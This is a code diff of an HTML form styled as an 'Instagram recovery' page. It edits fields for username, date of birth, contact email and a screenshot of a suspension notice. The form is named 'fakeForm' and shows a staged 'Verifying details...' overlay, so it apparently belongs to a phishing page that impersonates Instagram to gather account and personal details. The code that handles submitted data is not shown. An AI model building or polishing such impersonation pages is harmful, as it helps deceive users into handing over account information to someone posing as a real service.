@@ -168,6 +168,7 @@
 
 <div class="contact-container">
     
+    <!-- Floating Blur Effect Overlay -->
     <div id="loadingOverlay">
         <img src="inlogo.png" alt="Loading" class="blinking-logo">
         <div class="verifying-text">Verifying details...</div>
@@ -178,16 +179,13 @@
     <h2 id="formTitle">Instagram recovery</h2>
     
     <form class="form-fields" id="fakeForm" onsubmit="validateAndRedirect(event)">
-        <label for="name">Instagram Name</label>
-        <input type="text" id="name" placeholder="Your Instagram name" autocomplete="off" required 
-               oninvalid="this.setCustomValidity('please enter your Instagram name')" 
-               oninput="this.setCustomValidity('')">
-
+        <!-- Username Field -->
         <label for="username">Username</label>
         <input type="text" id="username" placeholder="Your Instagram username" autocomplete="off" autocorrect="off" spellcheck="false" required 
                oninvalid="this.setCustomValidity('please enter your username')" 
                oninput="this.setCustomValidity('')">
 
+        <!-- DOB optional green -->
         <label for="dob">Date of Birth <span class="optional-text">(Optional)</span></label>
         <input type="date" id="dob" autocomplete="off">
 
@@ -202,9 +200,11 @@
             <option value="prefer_not_to_say">Prefer not to say</option>
         </select>
 
+        <!-- Contact Email is not required -->
         <label for="contactEmail">Contact Email</label>
         <input type="email" id="contactEmail" placeholder="Your contact email" autocomplete="off">
 
+        <!-- Upload Screenshot with Proper English -->
         <div class="screenshot-container">
             <label for="screenshot">Upload Screenshot</label>
             <span class="screenshot-help">Upload a screenshot of the suspended or disabled message.</span>
